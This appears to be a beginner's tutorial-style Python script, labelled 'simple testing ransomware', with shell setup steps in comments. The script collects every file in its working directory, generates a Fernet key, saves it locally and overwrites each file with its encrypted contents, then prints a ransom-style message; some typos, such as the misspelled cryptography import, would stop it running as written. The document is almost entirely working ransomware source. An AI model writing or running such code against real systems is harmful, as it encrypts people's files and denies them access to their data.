#creating the environment in linux
# simple testing ransomware

# mkdir ransomware
# cd ransonware

# echo "This is file" > file.txt
# echo "file alone" > file2.txt
# echo "Another one" > hey.txt
# echo "one more" > pleasedonthurtme.txt

# #creating ransomware

# nano ransomware.py
# !/usr/bin/env pyhton3

import os
from crypyography.fernet import Fernet

#let's find some files

files = []

for file in os.listdir():
	if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile .write(contents_encrypted)


print("Sorry, all your files has been encrypeted!")